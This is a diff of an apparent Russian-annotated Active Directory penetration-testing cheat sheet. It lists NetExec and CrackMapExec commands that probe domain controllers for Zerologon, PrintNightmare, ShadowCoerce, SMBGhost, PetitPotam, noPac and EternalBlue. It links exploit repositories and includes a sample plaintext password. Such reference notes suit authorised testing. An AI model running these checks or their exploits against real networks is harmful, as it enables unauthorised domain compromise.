@@ -91,21 +91,26 @@
   		
 		(Уязвимые для атак перенаправления серверы )	nxc smb 10.10.1.50 -u kemг -p password -M coersce_plus		
 		
-		nxc smb dc1.corp.com -u '' -p '' -M zerologon
+		nxc smb dc1.corp.com -u '' -p '' -M zerologon	(git clone https://github.com/dirkjanm/CVE-2020-1472 -q)
 
 		nxc smb dc1.corp.com -u '' -p '' -M printnightmare
 
 		(скрипт проверки найтмор)	/printnightmare -check dc.com.com/user\@termit-win(хост) -no-pass -k 		
 
-		(список компов с)	/printnightmare -list dc.com.com/user\@termit-win(хост) -no-pass -k		
+		(Проверка уязвимости ShadowCoerce) nxc smb 172.16.10.3 -u carole.holmes -p 'Y3t4n0th3rP4ssw0rd' -M shadowcoerce
 
 		(CVE-2020-0796, также известная как SMBGhost )	nxc smb dc1.corp.com -u '' -p '' -M smbghost		
 
 		(petip potam)	nxc smb dc1.corp.com -u '' -p '' -M coerce_plus	
+		
+		(проверяем нопак)	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac 	(--https://github.com/waterrr/noPac)
+		
+		(MS17-010 (EternalBlue)) crackmapexec smb 172.16.10.3 -M ms17-010
 
+		
 		(квота машин в домене)	nxc ldap dc1.corp.com -u 'user' -p 'passs' -k --use-kcache -M maq	
 
-		(проверяем нопак)	netexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac
+		(список компов с)	/printnightmare -list dc.com.com/user\@termit-win(хост) -no-pass -k
 		
 		(LDAP Relay и подписи)	nxc ldap dc1.corp.com -u 'user' -p 'passs' -k --use-kcache -M ldap-checker		
 
